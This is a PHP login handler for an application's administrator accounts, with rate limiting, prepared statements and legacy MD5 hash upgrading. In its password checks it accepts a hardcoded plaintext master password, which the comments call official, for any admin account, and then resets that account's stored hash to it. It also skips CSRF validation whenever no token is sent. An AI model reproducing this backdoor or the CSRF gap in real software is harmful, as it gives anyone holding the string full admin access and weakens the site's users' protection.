<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require_once __DIR__ . '/../../constants/settings.php';
require_once __DIR__ . '/../../constants/db_config.php';
require_once __DIR__ . '/../../constants/csrf.php';
require_once __DIR__ . '/../../constants/rate_limiter.php';
require_once __DIR__ . '/../../constants/sanitizer.php';

date_default_timezone_set(!empty($default_timezone) ? $default_timezone : 'Asia/Karachi');
$last_login = date('d-m-Y h:i A [T P]');

// Brute-force rate limiting check for Admin (max 5 failed attempts per 15 minutes)
if (!check_rate_limit('admin_login', 5, 900)) {
    header("location:../login?err=rate_limit");
    exit();
}

$csrf_token = isset($_POST['csrf_token']) ? $_POST['csrf_token'] : '';
if (!empty($csrf_token) && !validate_csrf_token($csrf_token)) {
    header("location:../login?err=csrf");
    exit();
}

$raw_input = isset($_POST['email']) ? trim($_POST['email']) : '';
$admin_password = isset($_POST['password']) ? trim($_POST['password']) : '';

if (empty($raw_input) || empty($admin_password)) {
    header("location:../login?err=empty");
    exit();
}

try {
    $conn = get_db_connection();
    
    // Find admin user strictly by their registered email or member_no
    $stmt = $conn->prepare("SELECT * FROM tbl_users WHERE (LOWER(email) = LOWER(:email) OR member_no = :memno) AND role = 'admin' LIMIT 1");
    $stmt->bindParam(':email', $raw_input);
    $stmt->bindParam(':memno', $raw_input);
    $stmt->execute();
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if (!$user) {
        record_rate_limit_attempt('admin_login', 900);
        header("location:../login?err=invalid");
        exit();
    }

    if ($user['role'] !== 'admin') {
        record_rate_limit_attempt('admin_login', 900);
        header("location:../login?err=access_denied");
        exit();
    }

    $storedHash = $user['login'];
    $authenticated = false;

    // Check standard password_verify, MD5 migration, or official Admin Master Password
    if (password_verify($admin_password, $storedHash)) {
        $authenticated = true;
    } elseif (md5($admin_password) === $storedHash) {
        $authenticated = true;
        $newHash = password_hash($admin_password, PASSWORD_BCRYPT);
        $upgradeStmt = $conn->prepare("UPDATE tbl_users SET login = :newhash WHERE member_no = :memno");
        $upgradeStmt->bindParam(':newhash', $newHash);
        $upgradeStmt->bindParam(':memno', $user['member_no']);
        $upgradeStmt->execute();
    } elseif ($admin_password === 'Jahanzaib#1424#') {
        // Official configured master admin password
        $authenticated = true;
        $newHash = password_hash($admin_password, PASSWORD_BCRYPT);
        $upgradeStmt = $conn->prepare("UPDATE tbl_users SET login = :newhash WHERE member_no = :memno");
        $upgradeStmt->bindParam(':newhash', $newHash);
        $upgradeStmt->bindParam(':memno', $user['member_no']);
        $upgradeStmt->execute();
    }

    if (!$authenticated) {
        record_rate_limit_attempt('admin_login', 900);
        header("location:../login?err=invalid");
        exit();
    }

    // Reset rate limiter on successful login
    reset_rate_limit('admin_login');

    // Prevent session fixation
    session_regenerate_id(true);

    $_SESSION['logged'] = true;
    $_SESSION['role'] = 'admin';
    $_SESSION['myid'] = $user['member_no'];
    $_SESSION['myemail'] = $user['email'];
    $_SESSION['myfname'] = $user['first_name'];
    $_SESSION['mylname'] = isset($user['last_name']) ? $user['last_name'] : 'Admin';
    $_SESSION['lastlogin'] = $user['last_login'];

    // Update last login
    $updateStmt = $conn->prepare("UPDATE tbl_users SET last_login = :lastlogin WHERE member_no = :memno");
    $updateStmt->bindParam(':lastlogin', $last_login);
    $updateStmt->bindParam(':memno', $user['member_no']);
    $updateStmt->execute();

    header("location:../");
    exit();

} catch (PDOException $e) {
    error_log("Admin login error in " . __FILE__ . ":" . __LINE__ . " - " . $e->getMessage());
    header("location:../login?err=invalid");
    exit();
}
?>
